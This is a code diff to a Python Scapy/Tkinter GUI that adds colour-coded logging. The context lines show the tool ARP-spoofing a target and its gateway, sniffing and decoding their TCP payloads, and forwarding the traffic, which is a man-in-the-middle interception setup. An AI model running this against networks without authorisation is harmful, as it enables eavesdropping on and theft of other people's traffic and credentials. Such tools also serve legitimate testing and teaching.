@@ -193,7 +193,7 @@ class NetworkScanGUI:
         if answered_list:
             return answered_list[0][1].hwsrc
         else:
-            self.log_message(f"No response for IP {ip}")
+            self.log_message(f"No response for IP {ip}", 'red')
         return None
 
     def safe_start_arp_spoofing(self):
@@ -211,7 +211,7 @@ class NetworkScanGUI:
             self.spoof_thread_stop_event.clear()
             self.sniff_thread_stop_event.clear()
 
-            self.log_message(f"Starting ARP spoofing: Target IP={target_ip}, Gateway IP={gateway_ip}")
+            self.log_message(f"Starting ARP spoofing: Target IP={target_ip}, Gateway IP={gateway_ip}", 'green')
             self.spoof_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, gateway_ip))
             self.spoof_thread.start()
             self.sniff_thread = threading.Thread(target=self.sniff_packets, args=(target_ip, gateway_ip))
@@ -227,13 +227,13 @@ class NetworkScanGUI:
         if not self.spoofing:
             self.log_message("ARP spoofing is not currently active.")
             return
-        self.log_message("Attempting to stop ARP spoofing...")
+        self.log_message("Attempting to stop ARP spoofing...", 'blue')
         self.spoof_thread_stop_event.set()
         self.sniff_thread_stop_event.set()
         self.join_thread(self.spoof_thread)
         self.join_thread(self.sniff_thread)
         self.spoofing = False
-        self.log_message("Stopped ARP spoofing.")
+        self.log_message("Stopped ARP spoofing.", 'blue')
         target_ip = self.target_ip_entry.get()
         gateway_ip = self.gateway_ip_entry.get()
         target_mac = self.get_mac(target_ip)
@@ -244,7 +244,7 @@ class NetworkScanGUI:
         if thread and thread.is_alive():
             thread.join(timeout=2)
             if thread.is_alive():
-                self.log_message("Thread did not terminate properly.")
+                self.log_message("Thread did not terminate properly.", 'red')
 
     @handle_exceptions
     def arp_spoof(self, target_ip, gateway_ip):
@@ -268,7 +268,7 @@ class NetworkScanGUI:
         packet2 = ether_frame2 / arp_reply2
 
         if not target_mac or not gateway_mac:
-            self.log_message("Could not find MAC addresses for the provided IPs.")
+            self.log_message("Could not find MAC addresses for the provided IPs.", 'red')
             return
 
         try:
@@ -277,8 +277,9 @@ class NetworkScanGUI:
                 sendp(packet2, iface=interface, verbose=False)
                 self.spoof_thread_stop_event.wait(2)
         except Exception as e:
-            self.log_message(f"Error in ARP spoofing: {e}")
+            self.log_message(f"Error in ARP spoofing: {e}", 'red')
 
+    # Sniffer
     @handle_exceptions
     def sniff_packets(self, target_ip, gateway_ip):
         interface = self.interfaces.get()
@@ -290,7 +291,7 @@ class NetworkScanGUI:
                     self.log_packet(packet)
                     self.forward_packet(packet, target_ip, gateway_ip)
         except Exception as e:
-            self.log_message(f"Error in sniffing packets: {e}")
+            self.log_message(f"Error in sniffing packets: {e}", 'red')
 
     @handle_exceptions
     def log_packet(self, packet):
@@ -302,9 +303,9 @@ class NetworkScanGUI:
                     # Decode the payload as UTF-8
                     decoded_payload = self.decode_payload(tcp_payload)
                     if len(decoded_payload) != 0:
-                        self.log_message(f'{packet[IP].src} :  {decoded_payload}')
+                        self.log_message(f'{packet[IP].src} :  {decoded_payload}', 'blue')
                 except UnicodeDecodeError as e:
-                    self.log_message(f"Failed to decode TCP payload: {e}")
+                    self.log_message(f"Failed to decode TCP payload: {e}", 'red')
 
     def decode_payload(self, payload):
         try:
@@ -330,25 +331,36 @@ class NetworkScanGUI:
     def restore_network(self, target_ip, gateway_ip, target_mac, gateway_mac):
         send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=False)
         send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=False)
-        self.log_message(f"Restored network: Target IP={target_ip}, Gateway IP={gateway_ip}")
+        self.log_message(f"Restored network: Target IP={target_ip}, Gateway IP={gateway_ip}", 'blue')
 
-    def log_message(self, message):
-        self.log_queue.put(message)
+    # Log message
+    def log_message(self, message, color='black'):
+        self.log_queue.put((message, color))
 
+    # Update the log
     def update_log(self):
         while not self.log_queue.empty():
-            message = self.log_queue.get_nowait()
+            message, color = self.log_queue.get_nowait()
             self.log_text.configure(state='normal')
-            self.log_text.insert(tk.END, message + '\n')
+            # Insert the message with a color tag
+            self.log_text.insert(tk.END, message + '\n', color)
             self.log_text.configure(state='disabled')
             self.log_text.yview(tk.END)
+        
+        # Configure the tag to display red text
+        self.log_text.tag_configure('red', foreground='red')
+        self.log_text.tag_configure('green', foreground='green')
+        self.log_text.tag_configure('blue', foreground='blue')
+        self.log_text.tag_configure('black', foreground='black')
+
+        # Recurring Call
         self.master.after(100, self.update_log)
 
     def safe_method(self, method):
         try:
             method()
         except Exception as e:
-            self.log_message(f"Error: {e}\n{traceback.format_exc()}")
+            self.log_message(f"Error: {e}\n{traceback.format_exc()}", 'red')
 
 def main():
     try:
